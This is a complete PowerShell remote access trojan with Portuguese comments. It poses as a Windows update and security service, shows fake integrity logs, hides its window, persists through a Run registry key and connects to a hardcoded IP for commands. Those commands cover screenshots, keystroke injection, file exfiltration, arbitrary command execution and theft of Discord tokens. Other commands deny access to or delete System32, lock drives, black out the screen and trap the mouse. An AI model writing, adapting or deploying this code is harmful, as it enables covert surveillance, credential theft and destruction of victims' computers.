<#
.SYNOPSIS
Windows Critical System Component - Complete Edition
.DESCRIPTION
Funções completas para controle remoto e destruição
.NOTES
Versão: 10.0.19045.1 - Ultimate Edition
#>

# ===== CONFIGURACOES =====
$serverIP = "198.1.195.194"  # MUDE PARA SEU IP
$serverPort = 4000
$installName = "WinUpdateSvc"
$mutexName = "Global\MicrosoftWindowsUpdateService"
$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WinUpdateSvc"
$userListFile = "$env:ProgramData\Microsoft\Windows\Caches\users.dat"
$debugLog = "$env:TEMP\rat_debug.log"

# ===== MUTEX - EVITA MULTIPLAS INSTANCIAS =====
$mutex = New-Object System.Threading.Mutex($false, $mutexName)
if (-not $mutex.WaitOne(0, $false)) { exit }

# ===== VERIFICAR ADMIN =====
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "ERRO: Execute como Administrador!" -ForegroundColor Red
    Start-Sleep -Seconds 5
    exit
}

# ===== FUNÇÃO DE LOG PARA DIAGNÓSTICO =====
function Write-DebugLog {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $Message" | Out-File -FilePath $debugLog -Append
}

# ===== FUNÇÕES DE USUÁRIO =====
function Remove-UserFromRAT {
    param([string]$UserName)
    try {
        $removido = $false
        if (Test-Path $registryPath) { Remove-Item -Path $registryPath -Recurse -Force -ErrorAction SilentlyContinue; $removido = $true }
        if (Test-Path $userListFile) { 
            $users = Get-Content $userListFile -ErrorAction SilentlyContinue
            $users = $users | Where-Object { $_ -ne $UserName }
            $users | Set-Content $userListFile -Force
            $removido = $true
        }
        if ($removido) { return "USUARIO_REMOVIDO" } else { return "USUARIO_NAO_ENCONTRADO" }
    } catch { 
        Write-DebugLog "Erro em Remove-UserFromRAT: $_"
        return "ERRO_AO_REMOVER" 
    }
}

function Get-RATUsers {
    try {
        $users = @()
        if (Test-Path $userListFile) { $users = Get-Content $userListFile -ErrorAction SilentlyContinue }
        if ($users.Count -eq 0) { return "Nenhum usuário encontrado" }
        return "USUARIOS:" + ($users -join "`n")
    } catch { 
        Write-DebugLog "Erro em Get-RATUsers: $_"
        return "ERRO_AO_LISTAR" 
    }
}

function Add-UserToList {
    param([string]$UserName)
    try {
        New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
        Add-Content -Path $userListFile -Value $UserName -Force
        New-Item -Path $registryPath -Force | Out-Null
        Set-ItemProperty -Path $registryPath -Name "UserName" -Value $UserName -Force
        Set-ItemProperty -Path $registryPath -Name "InstallDate" -Value (Get-Date).ToString() -Force
        return $true
    } catch { 
        Write-DebugLog "Erro em Add-UserToList: $_"
        return $false 
    }
}

$currentUser = "$env:COMPUTERNAME@$env:USERNAME"
$userExecuted = $false
if (Test-Path $userListFile) {
    $users = Get-Content $userListFile -ErrorAction SilentlyContinue
    if ($users -contains $currentUser) { $userExecuted = $true }
}
if (-not $userExecuted) { Add-UserToList $currentUser }

# ===== LOGS FAKES =====
Write-Host ""
Write-Host "==================================================" -ForegroundColor Cyan
Write-Host "    WINDOWS SECURITY MODULE" -ForegroundColor Cyan
Write-Host "==================================================" -ForegroundColor Cyan
Write-Host ""
Start-Sleep -Seconds 1
Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Inicializando..." -ForegroundColor Gray
Start-Sleep -Milliseconds 500
Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Verificando integridade..." -ForegroundColor Gray
Start-Sleep -Milliseconds 500
Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Sistema seguro" -ForegroundColor Green
Start-Sleep -Seconds 2

# ===== ESCONDE JANELA =====
Add-Type -Name Window -Namespace Console -MemberDefinition @'
    [DllImport("Kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("User32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'@
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# ===== FUNCOES BASICAS =====
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# ===== CAPTURA DE TELA =====
function Get-ScreenCapture {
    try {
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        $graphics.Dispose()
        $bitmap.Dispose()
        $base64 = [Convert]::ToBase64String($ms.ToArray())
        $ms.Dispose()
        Write-DebugLog "Screenshot capturado"
        return "SCREEN:$base64"
    } catch {
        Write-DebugLog "Erro ao capturar screenshot: $_"
        return "SCREEN_ERROR"
    }
}

# ===== MOUSE =====
function Move-Mouse { 
    param($x, $y)
    try {
        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point([int]$x, [int]$y)
        return "OK"
    } catch { 
        Write-DebugLog "Erro ao mover mouse: $_"
        return "MOUSE_ERROR" 
    }
}

function Click-Mouse {
    try {
        [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
        return "OK"
    } catch { 
        Write-DebugLog "Erro ao clicar: $_"
        return "CLICK_ERROR" 
    }
}

function RightClick-Mouse {
    try {
        [System.Windows.Forms.SendKeys]::SendWait("+{F10}")
        return "OK"
    } catch { 
        Write-DebugLog "Erro ao clicar direito: $_"
        return "RIGHTCLICK_ERROR" 
    }
}

# ===== TECLADO =====
function Send-Key {
    param($key)
    try {
        [System.Windows.Forms.SendKeys]::SendWait($key)
        return "OK"
    } catch { 
        Write-DebugLog "Erro ao enviar tecla: $_"
        return "KEY_ERROR" 
    }
}

function Send-Text {
    param($text)
    try {
        [System.Windows.Forms.SendKeys]::SendWait($text)
        return "OK"
    } catch { 
        Write-DebugLog "Erro ao enviar texto: $_"
        return "TEXT_ERROR" 
    }
}

# ===== ARQUIVOS =====
function Get-FileList {
    param($Path)
    try {
        $items = Get-ChildItem $Path -ErrorAction SilentlyContinue | ForEach-Object {
            [PSCustomObject]@{
                Name = $_.Name
                Type = if ($_.PSIsContainer) { "PASTA" } else { "ARQUIVO" }
            }
        }
        return ($items | ConvertTo-Json -Compress)
    } catch { 
        Write-DebugLog "Erro ao listar arquivos: $_"
        return "[]" 
    }
}

function Download-File {
    param($Path)
    try {
        if (Test-Path $Path) {
            $content = [Convert]::ToBase64String([IO.File]::ReadAllBytes($Path))
            return "FILE:$content"
        }
        return "FILE_NOT_FOUND"
    } catch { 
        Write-DebugLog "Erro ao baixar arquivo: $_"
        return "DOWNLOAD_ERROR" 
    }
}

# ===== COMANDOS =====
function Execute-Command {
    param($Cmd)
    try {
        $result = Invoke-Expression $Cmd 2>&1 | Out-String
        return $result
    } catch {
        Write-DebugLog "Erro ao executar comando: $_"
        return "Erro: $_"
    }
}

# ===== DISCORD TOKEN =====
function Get-DiscordToken {
    try {
        $tokens = @()
        $paths = @(
            "$env:APPDATA\discord\Local Storage\leveldb",
            "$env:APPDATA\discordptb\Local Storage\leveldb",
            "$env:APPDATA\discordcanary\Local Storage\leveldb",
            "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
            "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb"
        )
        foreach ($path in $paths) {
            if (Test-Path $path) {
                Get-ChildItem "$path\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
                    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
                    $regex = [regex]::new('[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}')
                    $matches = $regex.Matches($content)
                    foreach ($match in $matches) { $tokens += $match.Value }
                }
            }
        }
        $tokens = $tokens | Select-Object -Unique
        if ($tokens.Count -eq 0) { return "TOKENS:Nenhum token encontrado" }
        Write-DebugLog "Tokens encontrados: $($tokens.Count)"
        return "TOKENS:" + ($tokens -join "`n")
    } catch {
        Write-DebugLog "Erro ao obter tokens: $_"
        return "TOKENS_ERROR"
    }
}

# ===== BLOQUEAR SYSTEM32 =====
function Block-System32 {
    try {
        Write-DebugLog "Iniciando Block-System32"
        $path = "C:\Windows\System32"
        
        takeown /f $path /r /d y 2>$null
        icacls $path /grant Administradores:F /t 2>$null
        
        $acl = Get-Acl $path
        $acl.SetAccessRuleProtection($true, $false)
        $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Deny")
        $acl.AddAccessRule($accessRule)
        Set-Acl $path $acl
        
        Write-DebugLog "System32 bloqueado com sucesso"
        return "SYSTEM32_BLOCKED"
    } catch {
        Write-DebugLog "Erro ao bloquear System32: $_"
        return "SYSTEM32_ERROR"
    }
}

# ===== APAGAR SYSTEM32 =====
function Delete-System32 {
    try {
        Write-DebugLog "Iniciando Delete-System32"
        $path = "C:\Windows\System32"
        
        if (Test-Path $path) {
            takeown /f $path /r /d y 2>$null
            icacls $path /grant Administradores:F /t 2>$null
            
            Remove-Item -Path $path -Recurse -Force -ErrorAction SilentlyContinue
            
            if (-not (Test-Path $path)) {
                Write-DebugLog "System32 apagado com sucesso"
                return "SYSTEM32_DELETED"
            } else {
                $newName = "C:\Windows\System32_old_$(Get-Random)"
                Rename-Item -Path $path -NewName $newName -Force -ErrorAction SilentlyContinue
                if (-not (Test-Path $path)) {
                    Write-DebugLog "System32 renomeado com sucesso"
                    return "SYSTEM32_RENAMED"
                } else {
                    return "SYSTEM32_DELETE_FAILED"
                }
            }
        } else {
            return "SYSTEM32_NOT_FOUND"
        }
    } catch {
        Write-DebugLog "Erro ao apagar System32: $_"
        return "SYSTEM32_ERROR"
    }
}

# ===== TRAVAR DISCOS (CORRIGIDO COM ${drive}) =====
function Lock-Drives {
    param([string[]]$Drives = @("C:", "D:"))
    $results = @()
    foreach ($drive in $Drives) {
        try {
            Write-DebugLog "Travando drive ${drive}"
            $path = $drive + "\"
            if (Test-Path $path) {
                $acl = Get-Acl $path
                $acl.SetAccessRuleProtection($true, $false)
                $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "Read", "Deny")
                $acl.AddAccessRule($accessRule)
                $accessRule2 = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "Write", "Deny")
                $acl.AddAccessRule($accessRule2)
                Set-Acl $path $acl
                
                $results += "$drive travado"
                Write-DebugLog "Drive ${drive} travado"
            } else {
                $results += "$drive não encontrado"
            }
        } catch {
            Write-DebugLog "Erro ao travar drive ${drive}: $_"
            $results += "$drive erro"
        }
    }
    return "DRIVES_LOCKED:" + ($results -join ";")
}

function Unlock-Drives {
    param([string[]]$Drives = @("C:", "D:"))
    $results = @()
    foreach ($drive in $Drives) {
        try {
            Write-DebugLog "Destravando drive ${drive}"
            $path = $drive + "\"
            if (Test-Path $path) {
                $acl = Get-Acl $path
                $acl.SetAccessRuleProtection($false, $true)
                $rules = $acl.Access | Where-Object { $_.IdentityReference -eq "Everyone" -and $_.AccessControlType -eq "Deny" }
                foreach ($rule in $rules) {
                    $acl.RemoveAccessRule($rule)
                }
                Set-Acl $path $acl
                $results += "$drive destravado"
                Write-DebugLog "Drive ${drive} destravado"
            } else {
                $results += "$drive não encontrado"
            }
        } catch {
            Write-DebugLog "Erro ao destravar drive ${drive}: $_"
            $results += "$drive erro"
        }
    }
    return "DRIVES_UNLOCKED:" + ($results -join ";")
}

# ===== TELA PRETA =====
$global:blackScreenForm = $null

function Black-Screen {
    try {
        $ps = [powershell]::Create()
        [void]$ps.AddScript({
            Add-Type -AssemblyName System.Windows.Forms
            $form = New-Object System.Windows.Forms.Form
            $form.WindowState = 'Maximized'
            $form.FormBorderStyle = 'None'
            $form.TopMost = $true
            $form.BackColor = 'Black'
            $form.ControlBox = $false
            $form.ShowInTaskbar = $false
            $form.KeyPreview = $true
            $form.Add_KeyDown({
                if ($_.KeyCode -eq 'Escape') { $form.Close() }
            })
            $form.ShowDialog()
        })
        $ps.BeginInvoke()
        Write-DebugLog "Tela preta ativada"
        return "BLACK_SCREEN"
    } catch {
        Write-DebugLog "Erro ao ativar tela preta: $_"
        return "BLACK_SCREEN_ERROR"
    }
}

function Unlock-Screen {
    try {
        [System.Windows.Forms.Application]::OpenForms | Where-Object { $_.BackColor -eq [System.Drawing.Color]::Black -and $_.WindowState -eq 'Maximized' } | ForEach-Object {
            $_.Invoke([Action]{ $_.Close() })
        }
        Write-DebugLog "Tela liberada"
        return "SCREEN_UNLOCKED"
    } catch {
        Write-DebugLog "Erro ao liberar tela: $_"
        return "UNLOCK_ERROR"
    }
}

# ===== TRAVAR MOUSE =====
$script:mouseLocked = $false
$script:lockThread = $null

function Lock-Mouse {
    try {
        if ($script:mouseLocked) { return "MOUSE_ALREADY_LOCKED" }
        
        $cSharpCode = @'
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
public class MouseLocker {
    [DllImport("user32.dll")]
    public static extern bool ClipCursor(ref RECT lpRect);
    
    [StructLayout(LayoutKind.Sequential)]
    public struct RECT {
        public int left, top, right, bottom;
    }
    
    public static void Lock() {
        RECT rect = new RECT();
        rect.left = 0;
        rect.top = 0;
        rect.right = 1;
        rect.bottom = 1;
        ClipCursor(ref rect);
    }
    
    public static void Unlock() {
        RECT rect = new RECT();
        rect.left = 0;
        rect.top = 0;
        rect.right = Screen.PrimaryScreen.Bounds.Width;
        rect.bottom = Screen.PrimaryScreen.Bounds.Height;
        ClipCursor(ref rect);
    }
}
'@
        
        try {
            Add-Type -TypeDefinition $cSharpCode -ReferencedAssemblies "System.Windows.Forms.dll" -ErrorAction Stop
            [MouseLocker]::Lock()
            $script:mouseLocked = $true
            Write-DebugLog "Mouse travado com ClipCursor"
            return "MOUSE_LOCKED"
        } catch {
            Write-DebugLog "Falha no ClipCursor, usando fallback: $_"
            $script:mouseLocked = $true
            $script:lockThread = [System.Threading.Thread]::new({
                while ($script:mouseLocked) {
                    try {
                        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
                        Start-Sleep -Milliseconds 1
                    } catch {}
                }
            })
            $script:lockThread.IsBackground = $true
            $script:lockThread.Start()
            Start-Sleep -Milliseconds 10
            if ($script:lockThread.IsAlive) {
                Write-DebugLog "Mouse travado com fallback"
                return "MOUSE_LOCKED"
            } else {
                Write-DebugLog "Fallback falhou"
                return "MOUSE_LOCK_ERROR"
            }
        }
    } catch {
        Write-DebugLog "Erro geral em Lock-Mouse: $_"
        return "MOUSE_LOCK_ERROR"
    }
}

function Unlock-Mouse {
    try {
        $script:mouseLocked = $false
        
        try {
            [MouseLocker]::Unlock()
        } catch {}
        
        if ($script:lockThread -and $script:lockThread.IsAlive) {
            $script:lockThread.Abort()
        }
        Write-DebugLog "Mouse liberado"
        return "MOUSE_UNLOCKED"
    } catch {
        Write-DebugLog "Erro ao liberar mouse: $_"
        return "MOUSE_UNLOCK_ERROR"
    }
}

# ===== MICROFONE =====
function Get-Microphone {
    try {
        Add-Type -AssemblyName System.Speech
        $speech = New-Object System.Speech.Recognition.SpeechRecognitionEngine
        $speech.SetInputToDefaultAudioDevice()
        $speech.RecognizeAsyncTimeout = 5000
        $speech.RecognizeAsync()
        Start-Sleep -Seconds 5
        $speech.RecognizeAsyncStop()
        Write-DebugLog "Microfone gravado"
        return "AUDIO:OK"
    } catch {
        Write-DebugLog "Erro no microfone: $_"
        return "AUDIO_ERROR"
    }
}

# ===== WEBCAM =====
function Get-Webcam {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        
        $webcam = New-Object System.Windows.Forms.Panel
        $webcam.Size = New-Object System.Drawing.Size(640, 480)
        $webcam.BackColor = 'Black'
        
        $form = New-Object System.Windows.Forms.Form
        $form.Text = "Webcam"
        $form.Size = New-Object System.Drawing.Size(660, 520)
        $form.Controls.Add($webcam)
        $form.Show()
        $form.TopMost = $true
        
        Start-Sleep -Milliseconds 500
        $form.Close()
        
        Write-DebugLog "Webcam ativada"
        return "WEBCAM:OK"
    } catch {
        Write-DebugLog "Erro na webcam: $_"
        return "WEBCAM_ERROR"
    }
}

# ===== PROCESSOS =====
function Get-ProcessList {
    try {
        $processes = Get-Process | Select-Object -First 20 Name | ConvertTo-Json -Compress
        return $processes
    } catch {
        Write-DebugLog "Erro ao listar processos: $_"
        return "PROCESS_ERROR"
    }
}

# ===== URL =====
function Open-Url {
    param($url)
    try {
        Start-Process $url
        Write-DebugLog "URL aberta: $url"
        return "URL_OPENED"
    } catch {
        Write-DebugLog "Erro ao abrir URL: $_"
        return "URL_ERROR"
    }
}

# ===== ENERGIA =====
function Power-Control {
    param($Action)
    try {
        switch ($Action) {
            "shutdown" { Stop-Computer -Force }
            "reboot" { Restart-Computer -Force }
        }
        Write-DebugLog "Comando de energia: $Action"
        return "POWER_$Action"
    } catch { 
        Write-DebugLog "Erro no comando de energia: $_"
        return "POWER_ERROR" 
    }
}

# ===== PERSISTENCIA =====
function Install-Persistence {
    $scriptPath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"
    New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
    Copy-Item $MyInvocation.MyCommand.Path $scriptPath -Force
    try {
        $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $regPath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -Force
    } catch {
        Write-DebugLog "Erro ao instalar persistência no registro: $_"
    }
    attrib +h +s +r $scriptPath
}

if (-not (Test-Path "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1")) {
    Install-Persistence
}

# ===== CONEXAO PRINCIPAL =====
while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TcpClient($serverIP, $serverPort)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true
        
        $writer.WriteLine("$env:COMPUTERNAME@$env:USERNAME")
        Write-DebugLog "Conectado ao servidor"
        
        while ($client.Connected) {
            $cmd = $reader.ReadLine()
            if ([string]::IsNullOrEmpty($cmd)) { continue }
            
            Write-DebugLog "Comando recebido: $cmd"
            
            if ($cmd -eq "screenshot") {
                $result = Get-ScreenCapture
                $writer.WriteLine($result)
            } elseif ($cmd -eq "click") {
                $writer.WriteLine((Click-Mouse))
            } elseif ($cmd -eq "rightclick") {
                $writer.WriteLine((RightClick-Mouse))
            } elseif ($cmd -eq "discord") {
                $writer.WriteLine((Get-DiscordToken))
            } elseif ($cmd -eq "block_system32") {
                $result = Block-System32
                Write-DebugLog "Resultado de block_system32: $result"
                $writer.WriteLine($result)
            } elseif ($cmd -eq "delete_system32") {
                $result = Delete-System32
                Write-DebugLog "Resultado de delete_system32: $result"
                $writer.WriteLine($result)
            } elseif ($cmd -eq "lock_drives") {
                $result = Lock-Drives
                $writer.WriteLine($result)
            } elseif ($cmd -eq "unlock_drives") {
                $result = Unlock-Drives
                $writer.WriteLine($result)
            } elseif ($cmd -eq "black_screen") {
                $writer.WriteLine((Black-Screen))
            } elseif ($cmd -eq "unlock_screen") {
                $writer.WriteLine((Unlock-Screen))
            } elseif ($cmd -eq "lock_mouse") {
                $writer.WriteLine((Lock-Mouse))
            } elseif ($cmd -eq "unlock_mouse") {
                $writer.WriteLine((Unlock-Mouse))
            } elseif ($cmd -eq "mic") {
                $writer.WriteLine((Get-Microphone))
            } elseif ($cmd -eq "webcam") {
                $writer.WriteLine((Get-Webcam))
            } elseif ($cmd -eq "processes") {
                $writer.WriteLine((Get-ProcessList))
            } elseif ($cmd -eq "shutdown") {
                $writer.WriteLine((Power-Control "shutdown"))
            } elseif ($cmd -eq "reboot") {
                $writer.WriteLine((Power-Control "reboot"))
            } elseif ($cmd -eq "list_users") {
                $writer.WriteLine((Get-RATUsers))
            } elseif ($cmd -eq "remove_current_user") {
                $writer.WriteLine((Remove-UserFromRAT $currentUser))
            } elseif ($cmd -eq "test") {
                $writer.WriteLine("PONG")
            } elseif ($cmd -eq "exit") {
                break
            } elseif ($cmd -match "^move (\d+) (\d+)$") {
                $writer.WriteLine((Move-Mouse $matches[1] $matches[2]))
            } elseif ($cmd -match "^key (.+)$") {
                $writer.WriteLine((Send-Key $matches[1]))
            } elseif ($cmd -match "^type (.+)$") {
                $writer.WriteLine((Send-Text $matches[1]))
            } elseif ($cmd -match "^ls (.+)$") {
                $writer.WriteLine((Get-FileList $matches[1]))
            } elseif ($cmd -match "^download (.+)$") {
                $writer.WriteLine((Download-File $matches[1]))
            } elseif ($cmd -match "^exec (.+)$") {
                $writer.WriteLine((Execute-Command $matches[1]))
            } elseif ($cmd -match "^url (.+)$") {
                $writer.WriteLine((Open-Url $matches[1]))
            } elseif ($cmd -match "^remove_user (.+)$") {
                $writer.WriteLine((Remove-UserFromRAT $matches[1]))
            } else {
                Write-DebugLog "Comando não reconhecido: $cmd"
                $writer.WriteLine("Comando nao reconhecido")
            }
        }
    } catch {
        Write-DebugLog "Erro na conexão: $_"
        Start-Sleep -Seconds 10
    } finally {
        if ($client) { $client.Close() }
    }
}

$mutex.ReleaseMutex()
$mutex.Dispose()
